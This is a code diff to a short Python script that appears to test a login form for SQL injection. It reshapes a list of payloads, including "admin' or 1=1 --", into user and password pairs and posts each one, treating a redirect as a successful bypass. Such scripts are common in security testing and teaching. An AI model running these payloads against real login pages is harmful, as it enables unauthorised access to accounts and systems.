@@ -4,12 +4,26 @@ headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
 }
 
+
 payloads = [
-    "admin",
-    "'",
-    "'+--",
-    "admin'+or+1=1+--"
+    {
+        "user": "admin",
+        "passw": "test"
+    },
+    {
+        "user": "'",
+        "passw": "'"
+    },
+    {
+        "user": "+--",
+        "passw": "test"
+    },
+    {
+        "user": "admin' or 1=1 --",
+        "passw": "test"
+    }
 ]
+
 
 class SqlInjection():
 
@@ -19,7 +33,7 @@ class SqlInjection():
         output = ""
         
         for payload in payloads:
-            data = f"uid={payload}&passw=test&btnSubmit=Login"
+            data = f"uid={payload['user']}&passw={payload['passw']}&btnSubmit=Login"
             response = requests.post(url, headers=headers, data=data, allow_redirects=False)
 
             if response.status_code == 302:
